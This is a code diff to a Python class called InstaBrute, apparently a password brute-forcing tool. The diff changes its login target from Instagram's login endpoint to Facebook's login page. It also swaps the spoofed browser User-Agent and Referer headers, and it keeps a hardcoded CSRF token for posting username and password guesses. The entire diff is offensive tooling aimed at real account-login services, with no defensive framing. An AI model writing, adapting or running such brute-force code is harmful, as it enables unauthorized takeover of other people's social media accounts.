@@ -113,7 +113,7 @@ class InstaBrute(object):
         os.system([linux, windows][os.name == 'nt'])
 
     def New_Br(self, user, pwd):
-        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+        login_url = 'https://www.facebook.com/login.php'
 
         time = int(datetime.now().timestamp())
 
@@ -126,9 +126,9 @@ class InstaBrute(object):
 
         with requests.Session() as s:
             r = s.post(login_url, data=payload, headers={
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
-                "Referer": "https://www.instagram.com/accounts/login/",
+                "Referer": "https://www.facebook.com/login.php",
                 "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
             })
 
